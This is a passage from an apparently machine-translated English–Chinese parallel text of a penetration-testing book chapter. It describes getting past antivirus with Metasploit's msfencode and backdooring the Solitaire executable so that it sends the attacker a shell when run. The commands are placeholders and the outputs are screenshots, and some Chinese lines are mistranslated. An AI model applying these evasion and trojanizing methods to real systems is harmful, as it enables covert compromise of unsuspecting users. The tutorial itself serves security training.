  type: TYPE_NORMAL
  zh: 我们要查看的下一个文件是我们的PDF文件。检测能力的示例如下屏幕截图所示：
- en: '![Bypassing antivirus and other protection tools](img/477-1_12_49.jpg)'
  id: totrans-184
  prefs: []
  type: TYPE_IMG
  zh: 绕过杀毒软件和其他保护工具
- en: Screen showing an example of the detection ability (the cropped text is not
    important)
  id: totrans-185
  prefs: []
  type: TYPE_NORMAL
  zh: 显示检测能力的屏幕（裁剪的文本不重要）
- en: We have an even lower detection rate for the PDF file, so we would get past
    more products with it than the binary payload.
  id: totrans-186
  prefs: []
  type: TYPE_NORMAL
  zh: 我们对PDF文件的检测率甚至更低，因此我们可以通过更多产品。比二进制有效负载更高。
- en: Obfuscation and encoding
  id: totrans-187
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 混淆和编码
- en: 'Since we know that our files are getting detected, we have methods to try to
    make them harder to detect, and as you can imagine with signature-based detection,
    the goal is to modify the file so that it does not match the signature. As we
    have done before, we will look at the modules that metasploit provides to try
    to modify the files'' signature. The tool we will look at is the `msfencode` in
    metasploit. We can review the usage of the tool by entering `msfencode –h`. The
    output of this command is shown in the following screenshot:'
  id: totrans-188
  prefs: []
  type: TYPE_NORMAL
  zh: 由于我们知道我们的文件正在被检测到，我们有方法可以尝试使它们更难以被检测到，可以想象，基于签名的检测的目标是修改文件，使其不匹配签名。与以前一样，我们将查看metasploit提供的模块，尝试修改文件的签名。我们将查看的工具是metasploit中的`msfencode`。我们可以通过输入`msfencode
    -h`来查看工具的用法。这个命令的输出如下屏幕截图所示：
- en: '![Obfuscation and encoding](img/477-1_12_50.jpg)'
  id: totrans-189
  prefs: []
  type: TYPE_IMG
  zh: '![混淆和编码](img/477-1_12_50.jpg)'
- en: 'The next thing we want to explore is the actual encoders themselves. The tool
    not only has a number of options, but also has quite a few different encoders
    as the list in the following screenshot shows:'
  id: totrans-190
  prefs: []
  type: TYPE_NORMAL
  zh: 我们接下来要探索的是实际的编码器本身。这个工具不仅有许多选项，而且有相当多不同的编码器，如下面的屏幕截图所示：
- en: '![Obfuscation and encoding](img/477-1_12_51.jpg)'
  id: totrans-191
  prefs: []
  type: TYPE_IMG
  zh: '![混淆和编码](img/477-1_12_51.jpg)'
- en: 'The last technique we will use to see the detection capability against it is
    the concept of a backdoor in an executable file. What we like about this is that
    we can backdoor any legitimate executable file, and when the user runs it, they
    will send a shell to us. The program we will use for this experiment is `sol.exe`,
    which is the Solitaire program. We will use one of the encoders, but before that,
    we have to copy the original `sol.exe` file from a Windows machine and place it
    in the templates folder as shown in the following screenshot:'
  id: totrans-192
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将使用的最后一种技术是在可执行文件中创建后门的概念。我们喜欢这一点的原因是我们可以在任何合法的可执行文件中创建后门，当用户运行它时，它们将向我们发送一个shell。我们将用于此实验的程序是`sol.exe`，即纸牌游戏程序。在使用编码器之前，我们必须从Windows机器上复制原始的`sol.exe`文件，并将其放在模板文件夹中，如下面的屏幕截图所示：
- en: '![Obfuscation and encoding](img/477-1_12_52.jpg)'
  id: totrans-193
  prefs: []
  type: TYPE_IMG
  zh: '![混淆和编码](img/477-1_12_52.jpg)'
- en: 'Once we have the file in the correct location, we will create the backdoor
    into the executable, and we will again use a combination of `msfpayload` with
    `msfencode`. Enter the following command:'
  id: totrans-194
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦我们将文件放在正确的位置，我们将在可执行文件中创建后门，并再次使用`msfpayload`和`msfencode`的组合。输入以下命令：
- en: '[PRE8]'
  id: totrans-195
  prefs: []
  type: TYPE_PRE
  zh: '[PRE8]'
- en: 'An example of the output from this command is shown in the following screenshot:'
  id: totrans-196
  prefs: []
  type: TYPE_NORMAL
  zh: 这个命令的输出示例如下屏幕截图所示：
- en: '![Obfuscation and encoding](img/477-1_12_53.jpg)'
  id: totrans-197
  prefs: []
  type: TYPE_IMG
  zh: '![混淆和编码](img/477-1_12_53.jpg)'
- en: 'Since we have used the encoder, we now want to see what results we get when
    it is uploaded to the Virustotal site. An example of this is shown in the following
    screenshot:'
  id: totrans-198
  prefs: []
  type: TYPE_NORMAL
  zh: 由于我们已经使用了编码器，现在我们想要看看将其上传到Virustotal网站后会得到什么结果。以下是一个示例：
- en: '![Obfuscation and encoding](img/477-1_12_54.jpg)'
  id: totrans-199
  prefs: []
  type: TYPE_IMG
  zh: '![混淆和编码](img/477-1_12_54.jpg)'
- en: 'Our encoding has been pretty successful. We now have only 14 percent of the
    products that will detect our code, so this is much better than before. Also,
    we have done only three iterations. We could potentially improve on this, and
    it is something you may want to experiment with, but for our purpose, we will
    stop encoding here. At this point, you will set up the multi-handler, and then
    execute the program; at this time, the victim will connect to your machine. An
    example of this is shown in the following screenshot:'
  id: totrans-200
  prefs: []
  type: TYPE_NORMAL
  zh: 我们的编码已经非常成功。现在只有14%的产品会检测到我们的代码，所以这比以前好多了。而且，我们只做了三次迭代。我们可能还可以进一步改进，这是你可能想要尝试的，但对于我们的目的，我们将在这里停止编码。在这一点上，你将设置多处理程序，然后执行程序；此时，受害者将连接到你的机器。这个示例如下屏幕截图所示：
- en: '![Obfuscation and encoding](img/477-1_12_55.jpg)'
  id: totrans-201
  prefs: []
  type: TYPE_IMG
  zh: '![混淆和编码](img/477-1_12_55.jpg)'
- en: Summary
  id: totrans-202
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 总结
- en: In this chapter, we discussed client-side attacks, and this continues to be
    the method of choice as vendors improve their security. We can still use the other
    methods we discussed throughout the book; as time passes, server-side attacks
    become less effective. However, as we said throughout, you have to test for all
    possibilities, and that is why we have a systematic process to follow. We started
    the chapter with looking at the concept of lure and bait with respect to getting
    a client to come to us.
  id: totrans-203
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们讨论了客户端攻击，随着供应商改进其安全性，这仍然是首选的方法。我们仍然可以使用本书中讨论的其他方法；随着时间的推移，服务器端攻击变得不那么有效。然而，正如我们在整本书中所说的，你必须测试所有可能性，这就是为什么我们有一个系统化的流程要遵循。我们从研究诱饵和诱饵的概念开始了本章，以便让客户端来到我们这里。
- en: Following the discussion of lure and bait, we looked at the pilfering of data,
    that is, what we can extract from the client once we have a shell. We used a number
    of enumeration tools that are available in metasploit to accomplish this.
  id: totrans-204
  prefs: []
  type: TYPE_NORMAL
  zh: 在讨论了诱饵和诱饵之后，我们研究了从客户端窃取数据的方法，也就是说，一旦我们有了shell，我们可以从客户端提取什么。我们使用了metasploit中可用的一些枚举工具来完成这个任务。
- en: Following this, we looked at the powerful technique of establishing a pivot
    point from a client, and then we carried out our attack against machines that
    we cannot access without the first compromised machine.
  id: totrans-205
  prefs: []
  type: TYPE_NORMAL
  zh: 在此之后，我们研究了从客户端建立一个枢纽点的强大技术，然后对我们无法访问的机器进行攻击，而这些机器是没有第一个受损机器的情况下无法访问的。
- en: The next area we discussed was the different types of client exploitation; we
    had `browser_autopwn`, binary payloads, and malicious PDF files.
  id: totrans-206
  prefs: []
  type: TYPE_NORMAL
  zh: '我们讨论的下一个领域是不同类型的客户端利用；我们有`browser_autopwn`，二进制载荷和恶意PDF文件。 '
- en: Finally, we closed the chapter and looked at bypassing detection by antivirus
    and other signature-based detection products. We created a backdoored executable
    in the Solitaire program and gained access once the program was executed to the
    victim's machine.
  id: totrans-207
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，我们关闭了这一章，并研究了如何绕过杀毒软件和其他基于签名的检测产品的检测。我们在纸牌游戏程序中创建了一个带后门的可执行文件，并在程序执行后获得了对受害者机器的访问权限。
- en: This concludes the chapter. In the next chapter, we will look at creating a
    complete architecture and putting all the concepts of this book together.
  id: totrans-208
  prefs: []
  type: TYPE_NORMAL
  zh: 本章到此结束。在下一章中，我们将看看如何创建一个完整的架构，并将本书中的所有概念整合在一起。
